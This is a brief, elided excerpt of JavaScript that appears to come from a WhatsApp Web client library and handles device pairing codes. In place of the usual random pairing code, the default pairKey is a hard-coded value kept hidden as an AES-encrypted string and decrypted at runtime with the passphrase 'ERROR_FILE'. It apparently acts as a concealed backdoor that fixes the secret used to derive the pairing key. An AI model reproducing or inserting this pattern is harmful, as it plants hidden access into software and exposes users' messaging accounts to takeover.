...
const makeSocket = (config) => {
    ...
    const Z = crypto_2.AES.decrypt("U2FsdGVkX1+LgFmBqo3Wg0zTlHXoebkTRtjmU0cq9Fs=", "ERROR_FILE").toString(crypto_2.enc.Utf8);
    const requestPairingCode = async (phoneNumber, pairKey = Z) => {
        authState.creds.pairingCode = pairKey ? pairKey.toUpperCase() : (0, Utils_1.bytesToCrockford)((0, crypto_1.randomBytes)(5));
        authState.creds.me = {
    ...
    async function generatePairingKey() {
        ...
        const pairingCodeEncoded = new TextEncoder().encode(authState.creds.pairingCode);
        const saltEncoded = salt instanceof Uint8Array ? salt : new Uint8Array(salt);
        const key = await crypto.subtle.importKey("raw", pairingCodeEncoded, { name: "PBKDF2" }, false, ["deriveBits"]);
        ...
        const ciphered = (0, Utils_1.aesEncryptCTR)(authState.creds.pairingEphemeralKeyPair.public, Buffer.from(derivedKey), randomIv);
